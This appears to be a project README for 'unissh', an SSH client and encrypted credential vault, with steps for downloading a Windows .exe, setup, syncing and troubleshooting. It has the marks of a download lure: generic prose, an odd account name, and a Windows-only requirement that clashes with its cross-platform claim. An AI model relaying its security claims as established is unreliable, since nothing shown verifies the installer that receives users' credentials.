# 🛡️ unissh - Securely manage your servers with ease

[![](https://img.shields.io/badge/Download-Unissh-blue.svg)](https://github.com/Propitiatory-agamid102/unissh)

unissh helps you connect to remote computers. It keeps your login information safe through encryption. You control the sync server. This setup ensures that only you access your data.

## 📥 How to download the program

You need to download the installer to start using the application. Follow these instructions:

1. Visit the [official releases page](https://github.com/Propitiatory-agamid102/unissh).
2. Look for the latest version at the top of the list.
3. Click the link that ends in .exe to start your download.
4. Open the file once the download finishes to begin the installation.

## ⚙️ System requirements

Your computer must meet these basic needs:

* Windows 10 or Windows 11.
* A stable network connection for server syncing.
* At least 200MB of free storage space.
* The application runs best with 4GB of RAM or more.

## 🚀 Setting up the application

Follow these steps to configure your account:

1. Launch the program from your desktop shortcut.
2. Choose a strong master password. You use this password to unlock your vault. Keep this password in a safe place.
3. Select your sync folder. This folder connects to your own server.
4. Input your server details. The program verifies the connection.
5. Save your settings. The dashboard opens once complete.

## 🔐 How your data stays private

unissh uses end-to-end encryption. This means your computer scrambles your data before it leaves your machine. Your server only stores the scrambled version. It cannot read or see your actual login credentials or keys. You hold the key to decode your information. This design creates a zero-knowledge environment.

## 🖥️ Using the terminal and SSH

The application features a built-in terminal. You can open a new connection window to manage your remote server.

1. Click the plus button in the sidebar.
2. Enter the address of your remote server.
3. Provide your username.
4. Select a credential from your vault.
5. Click connect to open the terminal.

The terminal supports standard commands. You can move files to your server using the built-in file manager. Drag and drop your files into the window to upload them.

## 🔄 Syncing your vault

You store your vault on a server you control. The program handles the synchronization automatically. Every time you add a new server or update a password, the changes save to your local database and push to your remote server. If you install unissh on a second computer, you simply point it to the same server to retrieve your data.

## 🛠️ Maintaining your vault

You perform maintenance inside the settings menu.

* Backup: Click the export button to save a copy of your vault to your local physical storage.
* Updates: The program checks for updates every time you open it. It notifies you if a new version exists.
* Cleanup: You can remove old server records from the vault management tab.

## 🧱 Troubleshooting common issues

Most issues stem from connection errors. Check these points if you fail to connect:

* Verify that your remote server allows SSH connections.
* Confirm that your internet connection is active.
* Check your firewall settings to ensure it allows unissh to reach the internet.
* Ensure you entered the correct server address and port number.
* If the sync fails, verify that your server has enough free disk space.

## 📁 Why use this tool

Many programs store your server passwords in the cloud. They can see your data. unissh changes this. You own the software and you host the storage. No third party tracks your connections. You get the convenience of a modern interface with the safety of local control. It works across different operating systems, which helps if you use more than one type of computer.

Keywords: cross-platform, e2ee, rust, secrets-manager, self-hosted, sftp, ssh, ssh-agent, ssh-client, tauri, terminal, tunnelling, zero-knowledge